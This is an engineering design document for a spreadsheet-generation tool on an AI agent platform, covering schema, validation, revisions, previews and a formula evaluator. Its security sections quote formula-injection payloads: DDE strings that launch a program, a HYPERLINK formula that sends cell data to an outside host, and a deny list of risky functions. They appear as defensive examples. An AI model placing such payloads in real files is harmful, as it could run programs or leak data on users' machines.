## Context

Facts verified on `origin/swift` (2026-10-21):

- Binary outputs already have a delivery path: `WorkspaceFsPort.write(path, bytes, content_type=, title=) -> PublishedArtifact` (`fred_sdk/contracts/runtime.py`), implemented by `FredWorkspaceFs` and injected for ReAct, Deep and Graph runtimes. PPT Filler builds its download `LinkPart` from it (`fill.py`, session-scoped output path).
- `ConversationFilesystemPort` is text-only; it cannot carry an `.xlsx`.
- A capability that only implements `tools()` keeps the default `execution_models=("react", "graph")`. `DeepAgentRuntime` subclasses `ReActRuntime`, so it gets the same tools.
- `html_artifact` needed a middleware prompt fragment because models pasted HTML instead of calling the tool; that fragment made it ReAct-only. Issue #2708 (always-on usage block per tool group) is the planned, execution-model-neutral replacement.
- openpyxl 3.1.5 is pinned by Knowledge Flow only; neither fred-core nor fred-agents depends on it today.
- The agent form's Simple view lists packs in `toolPacks.ts` (`document_production`: Word, PowerPoint, web page). Capability names and field titles are i18n keys.
- Manifest default `team_scope` is `ADMIN_GATED`.

## Goals / Non-Goals

**Goals:** a correct, nicely formatted `.xlsx` from one tool call; every malformed input rejected with a message the model can act on; same behaviour on ReAct, Deep and Graph; no new platform surface.

**Non-Goals:** charts, conditional formatting, merged cells, multiple tables per sheet, editing a workbook the user changed outside the chat, templates, functions outside the allow-list (D14), editing in the preview, server-side export of query results.

## Decisions

Owner decisions (2026-10-21) closed the draft's open questions: new small package (Q1), download chip only (Q2), per-column currency symbol (Q3), admin-gated like other capabilities (Q4), templates in a later slice (Q5).

### D1. New capability in its own package

- `writable_document` is a co-edited Markdown document with an owned table, an editor side panel and a router export. A spreadsheet has none of that lifecycle.
- `fred-capability-documents` holds readers over Knowledge Flow ports; writing files is a different direction and different ports.
- The tabular MCP server (Knowledge Flow) is read-only SQL over ingested datasets.
- The PPT package is mid-rework and couples python-pptx and LibreOffice; a separate package `fred-capability-spreadsheet` shares nothing with it.

### D2. Tool schema (Mistral-friendly)

```
create_spreadsheet(
  file_name: str,                       # without extension; sanitised
  sheets: list[Sheet],                  # 1..10
  language: str | None = None,          # "fr" | "en", totals label; fr by default
)
Sheet  = { name: str, columns: list[Column], rows: list[list[str | int | float | bool | None]] }
Column = { header: str,
           type: "text" | "number" | "integer" | "percent" | "currency" | "date" = "text",
           currency: "EUR" | "USD" | "GBP" | "CHF" | "JPY" | "CNY" | "CAD" | "AUD" | None = None,
           width: int | None = None,      # characters; computed when absent
           total: "sum" | "average" | "min" | "max" | "count" | None = None }
```

Scalar cells only: dates are ISO strings (`YYYY-MM-DD`); percents accept `0.15` or `"15%"`; numeric strings accept a decimal comma and a currency sign, but a lone thousands-like comma (`"1,234"`, `"$1,500"`) is refused as ambiguous and NaN/Infinity are refused; the description asks for amounts as JSON numbers. `language` is a tool argument because `CapabilityContext` does not carry the turn's `runtime_context.language`; exposing it there would be an SDK contract change, not worth it for one label. Enum values are case-insensitive. `currency` applies to `currency` columns only; without it the column uses `#,##0.00` with no symbol. Unknown keys are ignored.

### D3. Generation

The writer (openpyxl, replaced by XlsxWriter in D15) in a worker thread (`asyncio.to_thread`), validation included, so the event loop never blocks. Header: bold, neutral fill, bottom border; `freeze_panes="A2"`; `auto_filter` over header and data. Number formats: integer `#,##0`, number `#,##0.00`, percent `0%` (up to two decimals when the values need them), currency `#,##0.00` with the symbol (`#,##0.00 "€"`, `"$"#,##0.00`, `"¥"#,##0`, ...), date: built-in `numFmtId 14` (written as `mm-dd-yy`, shown by Excel and LibreOffice in the reader's short-date format). Widths: declared (clamped 4..100), else `min(max(len(header), longest cell) + 2, 60)`. Totals row: bold, label in the first text column without a total naming the functions used, in column order without repeats and in the conversation language (fr: Total, Moyenne, Min, Max, Nombre; en: Total, Average, Min, Max, Count; e.g. "Total / Moyenne"), `=SUM(B2:B{n})` etc. in the flagged columns (`COUNTA` for a text column's count), with the column's number format. Workbook `creator="Fred"`. `prepare` validates and converts every value once (control characters stripped from text cells and headers); the writer and the preview both read its result, so one error context serves both. Byte-identical output is not a goal: openpyxl stamps zip and core-property times; tests read the workbook back instead.

### D4. Validation and limits

Rejected with an `is_error` result naming sheet / row / column: sheet name empty, longer than 31, containing `[]:*?/\` or control characters, starting or ending with `'`, `History` (reserved by Excel), or duplicated (case-insensitive); a header over 2 000 characters; an ambiguous or non-finite number; zero columns; a row longer or shorter than the columns; a value not convertible to its column type; a `sum`/`average`/`min`/`max` total on a text or date column. Limits: 10 sheets, 50 columns, 5 000 rows per sheet, 50 000 cells in total, 2 000 characters per cell, 10 MB output. Rows are never truncated silently: a limit error tells the model to state the limit to the user plainly and suggest splitting the data, and the tool description says so too.

### D5. Formula-injection guard

Superseded in part by D13 (2026-10-28): formulas now also come from a column `formula` and from formula cells, always parsed and checked against the allow-list; the rejection below remains for a formula sent as a plain string, with a message that names the formula-cell form. Text cells keep the literal rule, and DDE or external-workbook patterns are refused (D17).

Originally only the totals row and the computed columns (D9) held formulas, generated by code. A model-written formula is rejected, not stored (owner decision 2026-10-21, after a live Deep-agent session where 7 of 17 calls sent `=SUM(B2:B6)` or `=B2/SUM($B$2:$B$6)` as values): any `=` value in a number, integer, percent or currency column, and a text cell matching `^=\s*` followed by a function call or a cell reference, return "formulas are not accepted in cells: send the computed value, set `compute` on the column for a per-row calculation (add, subtract, multiply, divide, share_of_total), and set `total` on the column for sums/averages". The message names the real arguments (`compute` and `total` on a column) rather than a `totals` option that does not exist. Any other text cell starting with `=`, `+`, `-`, `@`, tab or carriage return is written as a literal string with the quote prefix, so data from documents or users cannot run as a formula.

### D6. Delivery

Path `spreadsheets/<session_id>/<file_name>-<short uuid>.xlsx` (the visible name gains `-v2`, `-v3` for revisions, D12) (the name drops `<>:"|?*`, and `#` and `%` as a stopgap for #3213); each call writes a new file and returns a new card, nothing is overwritten, through `workspace_fs.write(..., content_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")`. The tool returns the preview card (D8), or the download `LinkPart` when no preview was stored, and a text result telling the model a download button is shown, so it does not write a link itself (PPT Filler wording). Missing `workspace_fs` or a write failure → `is_error` result, logged.

### D7. Model steering without middleware

The tool description carries the steering ("when the user asks for an Excel file, spreadsheet, .xlsx or a table to download, call this tool; never paste a Markdown table instead"; literal computed values only, no formulas; call once per file and answer after a success). The success text ends with "File created and shown to the user. Do not create it again; reply now." The same live session had a sub-agent recreate an already-created file 8 times, so the tool also keeps a per-turn map from a SHA-256 of the normalized request (sanitized file name, sheets, language) to the created file name: an identical repeat returns the first text with no new file and no new card. Tools are built per execution request (`_build_capability_block`), so the closure is the per-turn key; nothing crosses turns or pods. Two identical calls racing in parallel can still both write (accepted: cheap guard, not a lock). No middleware, so Graph stays supported. If the live check shows the default model ignoring the tool, the usage block comes from #2708, not from a ReAct-only middleware. On Deep agents the description also tells a sub-agent not to call the tool but to return the data (compact table or JSON) to the delegating agent, which creates one workbook. The tool cannot refuse a sub-agent call itself: Deep sub-agents receive the same tool instances (`subagent_tools` in `deep_runtime.py`) and `CapabilityContext` carries no sub-agent signal; the general fix is #3219.

### D8. In-chat preview (owner decision 2026-10-21, option A)

- In the same worker thread, `build_preview` turns the validated request into JSON: per sheet the columns (type, currency, decimals the Excel format shows, total kind), typed values (dates as ISO strings), the first 500 rows, the full `row_count`, and a totals row computed in Python to mirror `SUM/AVERAGE/MIN/MAX/COUNT(A)` over every row. Display only; the `.xlsx` keeps its formulas.
- The JSON is written beside the file (`<file>.preview.json`) through `workspace_fs`, like PPT Filler's PDF beside its `.pptx`. No new endpoint: the frontend fetches the durable `/fs/download` href with the session bearer.
- The `spreadsheet_preview` part (preview id = storage key, file name, both hrefs) is declared in `manifest.chat_parts` with `SidePanelSpec(widget="spreadsheet_pane")`. A preview build or upload failure is logged and falls back to the `LinkPart`; it never costs the file.
- Frontend plugin `features/capabilities/spreadsheet/`: the card registers the file in a small slice (launcher, restore) and opens the pane on a live creation; the lazy pane renders an Excel-like `<table>` in one scroll area: frozen column letters, row numbers and row 1 (the workbook header, as the file freezes it), the totals row last with its file row number, column widths from the writer's rule measured on the preview rows (no wrapping except a long text column), `Intl` number/currency/percent/date formats in the UI language (one formatter set per column, one formatting pass per sheet), memoized rows so a selection change re-renders only the rows it touches, the whole `thead` sticky at the top, a `title` with the full text on cells that may be clipped, and a name box with the selected cell's address and content. The grid has one focusable cell (the selection); arrow keys move it. Sheet tabs sit in a fixed bottom strip (`tablist`, arrow keys), with scroll arrows when they overflow. `DataTable` was not reused: it is a paginated list table keyed by column label, without a totals row or frozen headings.

- Formula bar (owner feedback 2026-10-21): like Excel, the bar above the grid reads name box, "fx", then the selected cell's formula or raw value; the cell keeps the computed value. The preview carries `formula` per computed column (the writer's `_formula` with `{row}` for the row, so it is the file's formula by construction) and `total_formula` per totals column (shared `_total_formula`), expanded on the client; per-cell formulas would grow the JSON with every row. A literal number shows unformatted (no grouping or symbol, up to 15 significant digits, percent as `96%`), dates and text as displayed. No marker on formula cells: the bar is enough and the grid stays plain.

### D9. Computed columns (owner decision 2026-10-21)

- Schema: `compute: {op, left, right, column, round}` on a column. `op` is `add`, `subtract`, `multiply`, `divide` (`left op right`; `+ - * /` accepted as aliases) or `share_of_total` (`column`, or `left`, divided by its column's `SUM`). An operand is a header of the same sheet (exact, then case-insensitive) or a number (a JSON number, or a string such as `"1.2"` or `"15%"` that matches no header). Names, not cell addresses: the model never computes an address, and the generated formula can only reach the same sheet.
- Rows: `null` at a computed column's position, which is what the description's single example shows; a row that leaves the computed columns out is accepted too (its length equals the non-computed column count) and gets the placeholders back. A value sent for a computed column is ignored, so a model that pre-fills it (even with a formula) still gets a file. Chosen as least error-prone: the model's usual alignment (one value per column) works, and so does omission.
- Formulas: `=C2*1.2`, `=C2-B2`, `=C2*(-2)` (negative literals in parentheses), `=ROUND(expr,d)` for `round` (a `number` column then shows `d` decimals), and `IFERROR(expr,"")` around `divide`, `share_of_total` and anything using a computed column that can be empty (an empty text result would otherwise give `#VALUE!`). Functions are only `SUM`, `ROUND`, `IFERROR`, plus the totals functions. The share range is absolute (`$B$2:$B$N`) over the data rows. A column `total` works unchanged: `SUM`/`AVERAGE`/`COUNT` skip the `""` results.
- Order: a computed column may reference any non-computed numeric column and computed columns placed before it; a reference to itself or a later computed column is rejected, so there is no cycle. A computed column without an explicit `type` is `number` (`percent` for `share_of_total`); an explicit `text` or `date` is rejected.
- Preview: `prepare` evaluates the formulas column by column with the same semantics (empty source cell = 0, empty computed cell propagates, division by zero = empty, `round` half away from zero like Excel's `ROUND`); the values feed the preview rows, totals, percent decimals and column widths. LibreOffice headless recalculation of a generated workbook gives the preview's values.
- Leaked row JSON (live session 78bfa4f2): a quote that closed a text value early put `Loyer", 1200, 1150, null, null, null], [` in one cell and shifted the next row's numbers under the wrong label; the viewer showed it as text ending in "null null null". A text value matching a quote, a comma, a JSON value and a closing bracket (end of text or `], [`) is rejected with an actionable error; quotes or brackets alone stay literal. JSON `null` was never rendered as text (empty in file and viewer). The strings `"null"`/`"None"` are not blanked: no live case, and they can be real text.
- Validation names sheet and column with the fix: unsupported op, unknown or ambiguous header (lists the headers), text/date reference, self or forward reference, missing operand, two numbers, division by a literal 0, `round` outside 0..10.

### D10. Targeted revisions: `changes` against the last delivered workbook

Model: ppt_builder's D23 (changes against the previous plan, whole deck re-rendered). A revision never patches the generated `.xlsx`: the tool applies the changes to the stored request (the base spec) and the **whole resulting request** goes through the normal path (validation, formula check and evaluation, writer, preview, hints), exactly as a full `sheets` call. One build path, one set of errors.

- **Schema.** `create_spreadsheet` takes `sheets` **or** `changes` (both non-empty → error). `file_name` and `language` left out keep the base's. A change is one flat object `{op, sheet, ...}`; nested columns, sheets and rows are plain objects validated in code, so the tool schema does not inline the column model twice (ppt D23 "schema cost": typed nesting doubled the schema). Ops:
  - `add_column {sheet, column, after?, values?}`: `column` as in `sheets` (a `compute`, `formula` or `total` included); `after` a header (default: last); `values` one per data row, or none (empty or computed).
  - `remove_column {sheet, column}` (header).
  - `edit_column {sheet, column, header?, type?, currency?, total?, compute?, formula?, width?}`: the fields given replace the column's; values kept and re-converted to the new type (a value that does not convert is an error naming the row). Not in the owner's list; added because "mets la colonne en euros" or "ajoute un total" otherwise needs remove + add, which loses the values.
  - `add_rows {sheet, rows, after?}`: `after` a row number (default: after the last data row).
  - `remove_rows {sheet, rows | where}`.
  - `edit_rows {sheet, rows | where, values}`: `values` maps headers to new values (partial row).
  - `edit_cell {sheet, cell, value}`: `cell` an A1 address of a data cell, as the preview's name box shows it; `value` may be a formula cell.
  - `rename_sheet {sheet, name}`, `add_sheet {sheet: <Sheet as in sheets>, after?}`, `remove_sheet {sheet}`.
  - `move_rows {sheet, rows | where, to_sheet, after?}`: rows leave `sheet` for `to_sheet`; a `to_sheet` that does not exist is created with the source's columns, placed after the source. This is the split ("sépare ce tableau en 2 onglets, avec dans le premier…": one `move_rows` with a `where`, plus a `rename_sheet`).
- **Addressing.** Sheets by name, columns by header (exact, then case-insensitive, as `compute`), rows by **file row number** (the header is row 1, the first data row is 2: what the preview and Excel show) or by `where {column, equals}` (case-insensitive for text, every matching row; zero matches is an error). All numbers and names refer to the **base**, never shifted by earlier changes of the same list (ppt D23); the changes are resolved on the base, then applied as one step: edits, then moves and removals, then insertions, then sheet renames. Two changes touching the same row, column or sheet in incompatible ways (edit a removed row, remove a column twice) are refused.
- **Formulas follow.** Structural changes adjust formula references like Excel (D16): inserted or removed rows and columns shift references; a range grows or shrinks with rows inserted or removed inside it, and a range that ended on the last data row follows rows appended after it; a renamed sheet is renamed in every reference. A change that would leave a formula pointing at a removed cell, column or sheet, or that moves rows a formula references, is refused, naming each dependent formula (sheet, cell) and the fix (edit it in the same `changes`).
- **Errors, nothing written, all at once.** Each bad change is listed with its index and the fix (`changes[2] (remove_rows): row 40 does not exist; sheet 'Budget' has data rows 2 to 14.`); an unknown header lists the sheet's headers; an unknown sheet lists the sheets. **No base** → `No file was written: there is no previous workbook in this conversation to change. Send the whole workbook in sheets.` **Nothing changed** (the resulting request equals the base, file name included) → an error saying so, with "do not tell the user it was changed" (ppt WP36).
- **What the model sees.** Every success text adds one bounded line (at most 600 characters, cut with "…") describing the delivered workbook: `Sheets: 'Budget' columns Poste, Budget, Réel, Écart; data rows 2-14, totals row 15 · 'Synthèse' …`, then "to change it later, call create_spreadsheet with changes". After history trimming the model may no longer see it; the error messages carry the same facts (headers, row range), so a wrong guess costs one round, not a wrong file.
- **Turn guards.** The per-turn identical-call guard (D7) keys on the request including `changes` and the base version, so a repeated `changes` call never applies twice. No ppt-style "corrected resend" logic: a spreadsheet call either delivers or errors, and an error never replaces the base, so a corrected resend always applies to the same base.

Rejected: rebuilding the base from conversation history (tool arguments are trimmed with history; ppt D23 rejected it for the same reason); patching the stored `.xlsx` (a second write path that the validator, evaluator and preview would not see); a read tool returning the current spec (one more tool and a round per revision; the one-line summary and the errors suffice).

### D11. Where the base lives

- **Capability-owned table** `cap_spreadsheet_workbook`, primary key `(session_id, agent_instance_id)`: `workbook_id` (stable across versions), `version`, `file_name`, `spec_json` (the normalized request as delivered: sheets, columns, values, formulas as stored text), `updated_at`. Own `DeclarativeBase`, no foreign keys, Alembic tree `spreadsheet_migrations/` returned by `migrations_location()`, version table `cap_spreadsheet_alembic_version` (AUTHORING "Owns tables?", same as writable_document and ppt_builder's `cap_ppt_builder_deck_plan`). A single initial revision (`down_revision = None`), so the CLAUDE.md one-head rule holds by construction; verified with `alembic heads` and a real `python -m fred_runtime migrate`.
- **Store.** `WorkbookSpecStore` with `get`/`put`, `SqlWorkbookSpecStore` (update-then-insert, retry on `IntegrityError`, as `SqlDeckPlanStore`) and `MemoryWorkbookSpecStore` for tests; a provider hook as in `deck_plans.py`. One engine per pod via `fred_core.sql.create_async_engine_from_config`.
- **When.** One upsert after a successful delivery (the `.xlsx` written; the preview is optional). Within a turn, the tool closure keeps the last delivered spec, so a second revision in the same turn does not read the database. No `session_id` or `agent_instance_id` (tests, evals) → memory only. A failed read is an error result ("could not load the previous workbook; send the whole workbook in sheets"); a failed write is logged and the file is still delivered (the next revision then applies to the previous stored version; the success text does not promise otherwise).
- **Size.** A spec is stored only up to 4 MB of JSON (≈ the 50 000-cell limit with long text); above, delivery succeeds, the row is cleared, and the success text says changes are not available for this file (send the whole workbook). Replica-safe: any pod reads the row.

Rejected: a control-plane table (capability code and data stay out of control-plane, AUTHORING boundary); the conversation filesystem port (optional, only built when the runtime has filesystem config, and agent-visible and editable through the Deep file tools); a `.spec.json` beside the file in workspace storage (`WorkspaceFsPort` is write-only; reading back needs an SDK port change).

### D12. Versioned file names and the latest card

- `workbook_id` is created with version 1 by a `sheets` call whose sanitized file name differs from the base's (or with no base). A `changes` call, or a `sheets` call with the base's file name, makes the next version of the same workbook. Visible names: `Budget.xlsx`, `Budget-v2.xlsx`, `Budget-v3.xlsx`; the storage path keeps its short uuid (D6), so nothing is overwritten and every earlier card still downloads its own file.
- The `spreadsheet_preview` part gains `workbook_id` and `version` (the `LinkPart` fallback has neither; it is shown as today). The frontend slice keeps the highest version per `workbook_id` from live parts and history replay; the card of the highest version shows a "Latest version" / "Dernière version" chip, older cards a muted "Version n" and stay usable. The pane header shows the version. Strings in `locales/{en,fr}`.

### D13. Formulas written by the model

- **Two explicit forms.** A column `formula`: the formula of the **first data row** (`=C2*D2`, `=XLOOKUP(A2,Tarifs!A2:A40,Tarifs!B2:B40,"")`), filled down like Excel (relative references shift by row, `$` references stay); rows send `null` there, as for `compute`. A formula cell `{"formula": "=SUM('Données 2025'!C2:C50)"}` anywhere a value goes, for one-off cells such as a summary sheet. The column type gives the number format of the result.
- **Plain strings stay data.** A plain string that parses as a formula with a function call or a reference (the parser of D14 decides, which now also catches `='Données 2025'!B2`, `=Synthèse!B2`, `=[x.xlsx]S!A1`, `=cmd|…`) is refused as today, the message giving the exact formula-cell form to send (`send {"formula": "=SUM(B2:B6)"} instead of the string`), or pointing to `total`/`compute` when that is what it is. Other text starting with `=`, `+`, `-`, `@`, tab or CR stays literal text with the quote prefix. So text copied from a document never becomes live, and the D5 lesson (models sending `=SUM(B2:B6)` instead of `total`) still gets an actionable round.
- **Function names in English, `,` separators** (the file format). A French formula (`=SOMME(B2:B5;C2)`) is refused with "use English function names and commas: =SUM(B2:B5,C2)"; a small table of common French names gives the English one in the message. No translation in code.
- **Cycles** (a formula reading its own cell, directly or through others) are refused, naming the cells.

### D14. Allow-list, prefixes and references

- **Allowed functions** (each one implemented by the D15 evaluator with Excel semantics; a function is allowed only if it is evaluated):
  - math: `SUM`, `SUMPRODUCT`, `PRODUCT`, `ROUND`, `ROUNDUP`, `ROUNDDOWN`, `INT`, `ABS`, `MOD`, `POWER`, `SQRT`;
  - statistics: `AVERAGE`, `MEDIAN`, `MIN`, `MAX`, `COUNT`, `COUNTA`, `COUNTBLANK`, `COUNTIF`, `COUNTIFS`, `SUMIF`, `SUMIFS`, `AVERAGEIF`, `AVERAGEIFS`, `MINIFS`, `MAXIFS`;
  - logical: `IF`, `IFS`, `IFERROR`, `IFNA`, `AND`, `OR`, `NOT`, `SWITCH`, `TRUE`, `FALSE`;
  - text: `CONCAT`, `CONCATENATE`, `TEXTJOIN`, `LEFT`, `RIGHT`, `MID`, `LEN`, `UPPER`, `LOWER`, `PROPER`, `TRIM`, `SUBSTITUTE`, `VALUE`, and the `&` operator;
  - date: `DATE`, `YEAR`, `MONTH`, `DAY`, `WEEKDAY`, `EDATE`, `EOMONTH`, `DATEDIF`;
  - lookup: `VLOOKUP`, `INDEX`, `MATCH`, `XLOOKUP`, `XMATCH`, and the dynamic arrays `FILTER`, `SORT`, `UNIQUE`.
- **Prefixes.** The model writes plain names; the writer emits the stored form Excel expects (`_xlfn.XLOOKUP`, `_xlfn.XMATCH`, `_xlfn.IFS`, `_xlfn.SWITCH`, `_xlfn.CONCAT`, `_xlfn.TEXTJOIN`, `_xlfn.MINIFS`, `_xlfn.MAXIFS`, `_xlfn.UNIQUE`, `_xlfn._xlws.FILTER`, `_xlfn._xlws.SORT`) through XlsxWriter's `use_future_functions`; prefixes the model sends are stripped first. `FILTER`, `SORT` and `UNIQUE` are written with `write_dynamic_array_formula` (spill metadata), so Excel does not show them as legacy `@` array formulas. A spill is evaluated at build time: it must fit in empty cells of the sheet, inside the sheet's columns and the row limit, else an error names the cell and the size.
- **Refused with a security message**: `INDIRECT`, `OFFSET`, `NOW`, `TODAY`, `RAND`, `RANDBETWEEN`, `RANDARRAY` (volatile: values change at each open, and `INDIRECT` hides its references from the check); `WEBSERVICE`, `FILTERXML`, `ENCODEURL`, `IMAGE`, `RTD`, `HYPERLINK` (network or link: `HYPERLINK("https://x/?"&A2)` exfiltrates a cell on click, so any target is refused, not only `file:`); `CELL`, `INFO` (environment and file path); `CALL`, `REGISTER.ID`, `EXEC` and any other XLM name; external workbooks (`[x.xlsx]`, a path or URL before `!`), DDE (`app|topic!item`, any `|` outside a string). Any other unknown function is refused with "not supported; supported: <families>". Defined names, structured table references (`Table1[@HT]`), R1C1 and whole-column or whole-row references (`B:B`, `2:2`, which would include the header and the totals row) are refused with the data-range form to use.
- **References.** A reference without a sheet is on its own sheet. A sheet-qualified reference must name a sheet of this workbook (case-insensitive, as Excel); it is written back in canonical form: the sheet's exact name, quoted when it is not `^[A-Za-z_][A-Za-z0-9_.]*$` or looks like a cell address (`'Données 2025'!B2`, `'Q1'!B2`, `Synthese!B2`, `'Synthèse'!B2` since a non-ASCII name is always quoted), with `'` doubled inside the name. The model may send the name quoted or not (`=Synthèse!B2` is accepted). A reference must stay inside the target sheet's columns and its rows 1 to the totals row; a range may not span data rows and the totals row (it would count the totals twice); an error names the sheet's column letters and row range.
- **Limits.** 8 192 characters per formula (Excel's limit), nesting depth 32, 5 000 formula cells written by the model per workbook (column formulas count once per row), and an evaluation budget (D15).

### D15. Evaluation, cached values and the writer

- **One evaluator.** A pure-Python module (`formulas.py`: tokenizer → AST → evaluator), no new dependency. It evaluates every formula of the workbook in dependency order (cross-sheet included) with Excel semantics for the allow-list: empty cell = 0 in arithmetic and `""` in text, booleans, error values (`#DIV/0!`, `#N/A`, `#VALUE!`, `#REF!`, `#NUM!`) propagated, `IFERROR`/`IFNA` catching them, criteria strings (`">10"`, `"<>x"`, wildcards `*` `?` `~`) for the `*IF(S)` family, case-insensitive text comparison, dates as serial numbers (1900 system), `ROUND` half away from zero. The values feed the cached values, the preview cells and totals, the percent decimals and the column widths.
- **Cached values in the file** (review fix): XlsxWriter's `write_formula(..., value=)` writes `<v>` beside `<f>` for every formula (totals, `compute`, column `formula`, formula cells; an error value as an error). The workbook sets full recalculation on load, so Excel and LibreOffice still recompute; viewers that do not (pandas without recalculation, some mobile and web previewers, mail previews) show the cached values instead of blanks.
- **Writer swap.** openpyxl cannot write a formula with its cached value or dynamic-array metadata; XlsxWriter does both, is already in the image (python-pptx depends on it), BSD-licensed and pure Python, and is usually faster. Workbook options: `strings_to_formulas`, `strings_to_numbers` and `strings_to_urls` all off (a string is always text), `use_future_functions` on. Formats as D3 (`num_format` 14 for dates, `quote_prefix` for trigger text). openpyxl moves to the test dependencies (tests read files back) and leaves the image with et-xmlfile.
- **Budget.** Evaluation runs in the build's worker thread under the existing 4-build slot. Each range is materialized once per evaluation and the `*IF(S)` family uses a per-range index (one pass per distinct criteria range), so a column of `SUMIF`s over a 5 000-row range is linear, not quadratic. A hard budget of 2 000 000 cell reads per workbook stops a pathological request with a limit error ("tell the user; use total or fewer lookups"), keeping one build well under a second at the existing limits. The performance reviewer runs on this path (task 9.4).
- **Preview.** Cells hold evaluated values (errors shown as Excel shows them); the formula bar shows the column template (`{row}`) as today plus a sparse `cell_formulas` map for formula cells, never one entry per filled-down cell.

Rejected: a formula library (`formulas`: EUPL-1.1, pulls numpy, scipy and schedula; `pycel`: GPLv3; `xlcalculator`: MIT but unmaintained since 2023, pulls pandas, scipy and mock, and has no `XLOOKUP`); LibreOffice recalculation (the image has only `libreoffice-impress-nogui`, Calc would grow it; Ubuntu 24.04's LibreOffice 24.2 lacks `XLOOKUP`, `FILTER`, `SORT` and `UNIQUE`, added in 24.8; one process spawn of 1 to 3 s per call); formulas without cached values (the review finding stays open for every free formula, and a summary sheet previews as formulas, not numbers).

### D16. `compute` and `total` compile to the formula path

`compute` and `total` stay in the schema as the preferred simple route: header names instead of addresses, the `IFERROR` wrapping, the absolute share range and the localized totals label are what made the weak-model live sessions work (D9, 4c-4g), and the derived-column and manual-total hints point to them. Their implementation is deleted and rebuilt on the formula path: each `compute` and each total becomes a formula AST (the same text as today: `=IFERROR(C2/SUM($C$2:$C$4),"")`, `=SUM(B2:B11)`), written, evaluated, cached and previewed by the one writer and evaluator. Goes: `_formula`, `_total_formula`'s string building, `_evaluate`, `_apply`, `_operand_value`, `_preview_totals`' own arithmetic. The file content of today's requests is unchanged (same formulas, now with cached values); existing tests stay as the regression net.

Rejected: keeping two per-row formula implementations (the consolidation rule); deleting `compute` in favour of column `formula` (loses header-name operands for weak models, and every derived-column hint would ask the model for addresses).

### D17. Text cells: DDE and external patterns refused

A text cell, header or sheet name whose text, after leading spaces, starts with `=`, `+`, `-`, `@` (or their full-width forms `＝＋－＠`) and holds a DDE pattern (`name|`, as in `=cmd|' /C calc'!A0`, `@SUM(1+1)*cmd|' /C calc'!A0`) or an external-workbook pattern (`[name.xls*]`, a path or URL followed by `!`) is refused, even though it would be written as quoted text: a user exporting the sheet to CSV and reopening it would get a live formula. The message says the text looks like a link to another program or file and asks to drop the leading sign or rephrase. Ordinary text (`- point`, `+33 6…`, `=== Section ===`, `a|b`) stays literal.

## Risks / Trade-offs

- Large tables cost output tokens: rows pass through the model. Mitigation: limits and Help Center wording; the server-side export of query results is a separate issue.
- Cached formula values come from our evaluator (D15). Excel and LibreOffice recompute on open (`fullCalcOnLoad`), so a rare evaluator difference only shows in viewers that do not recalculate and in the preview.
- XlsxWriter is already in the fred-agents image (python-pptx); openpyxl and et-xmlfile leave the image (test dependency only).
- One upsert per delivery and one read per `changes` call that has no in-turn base (D11): small async queries on the pod's pool, never on the event loop's critical path for a plain `sheets` call.
- Generation runs on the default thread pool, bounded per pod at 4 concurrent builds (fail fast over the bound, as PPT Filler); the 50 000-cell limit keeps one call to well under a second.
- Each file now writes two objects (the `.xlsx` and its preview, at most a few hundred KB for 500 rows x 50 columns); the preview shows in the agent workspace listing next to the file, as PPT Filler's PDF does.

## Known limitations

- Erasing a conversation leaves its `.xlsx` and `.preview.json` in workspace storage, as for PPT Filler outputs (#3212).
- The card auto-opens the pane with the shared page-load heuristic of the other capability cards (#3214).

## Owner decisions (2026-10-28)

The open questions of the scoping pass are closed; every recommended option was confirmed:

1. Base storage (D11): capability-owned table `cap_spreadsheet_workbook` with its own Alembic tree.
2. Preview values (D15): own evaluator over the allow-list, cached values for every formula, XlsxWriter writer.
3. Allow-list breadth (D14): the broad list, `FILTER`/`SORT`/`UNIQUE` included with spill checks.
4. `compute` and `total` (D16): kept in the schema, rebuilt on the formula path, the old implementation deleted.
5. Formula surface (D13): explicit forms only (column `formula`, formula cells); plain `=` strings still refused with the exact form.
6. `edit_column` is included in the revision ops (D10); the migration note moves to `impact: minor`.

## Implementation notes (2026-10-28)

Where the code settled a detail the decisions above left open, or diverged from their wording:

- D13: in a column formula, a range written without any `$` is anchored (`Tarifs!A2:A40` -> `Tarifs!$A$2:$A$40`), since every row reads the whole table; a model-written relative lookup range would otherwise slide out of the table when filled down. A single cell still shifts; a fill-down that leaves the table gets "a cell every row reads must be written with $".
- D10: formulas sent inside `changes` (a new column's `formula`, an edited cell) are written for the resulting workbook; only formulas already in the base are remapped. A row cannot be edited and moved in the same call. Rows inserted above the first row of a range shift it down, as Excel does; inside it, they widen it; appended after a range ending on the last data row, they extend it. A repeated identical `changes` call in a turn returns the first result (deduplicated on its arguments, not on the base version).
- D15: XlsxWriter stores any formula whose text names a dynamic-array function (`XLOOKUP`, `FILTER`, `SORT`, `UNIQUE`, also inside quoted text) as a one-cell dynamic array; harmless for Excel and LibreOffice. Formulas are emitted in stored form from the AST and XlsxWriter's regex rewrite is bypassed (it cost ~30 regex scans per formula). `SUM($B$2:B2)` running totals over thousands of rows read too many cells for the budget; the limit message suggests `=C1+B2`. A spill that reads another spill's cells is evaluated after anchors in row order.
- D16: the manual-total hint compares rows with the evaluator's own `SUM`/`AVERAGE`/`MIN`/`MAX`. The preview's `AVERAGE` of a column with no number now shows `#DIV/0!`, as Excel does (was empty).
- Performance review: applying changes and serializing requests run in a worker thread (~180 ms at the cell limit on the event loop before the fix).

## Deferred gaps

Known limits after this change, kept on #3215 or their own issues:

- Only the **last** workbook delivered in the conversation (per agent) can be revised; an older card's file, a file the user edited in Excel, or an uploaded workbook cannot be the base.
- Stored bases are never deleted (no session-deletion hook reaches a capability, as `cap_ppt_builder_deck_plan`; per-instance cleanup #2990, erasure cascade #3212). One row per conversation and agent, up to 4 MB.
- Two deliveries racing in the same conversation: last writer wins the base.
- A `SUM($B$2:B2)`-style running total over thousands of rows exceeds the evaluation budget (use `=C1+B2`).
- Not available: `TEXT`, `TODAY`/`NOW` and other volatile functions, `INDIRECT`/`OFFSET`, `HYPERLINK`, defined names, structured table references, whole-column references, R1C1, legacy array (CSE) formulas, external links, functions outside D14. French function names are refused with the English form, not translated.
- The evaluator follows Excel for the allow-list, but edge cases (floating-point display, the 1900 leap-year quirk, rare criteria syntax) can differ; Excel and LibreOffice recompute on open, so only non-recalculating viewers and the preview could show such a difference.
- A spill (`FILTER`, `SORT`, `UNIQUE`) is checked against the data at build time; data edited later in Excel can still produce `#SPILL!` there.
- The model sees the workbook's structure only through the one-line summary of the last success and the error messages; no read tool.
- Charts, conditional formatting, merged cells, templates: #3215.

## Out of scope / later

See the proposal's list; ranked roadmap in #3215.

## Follow-ups

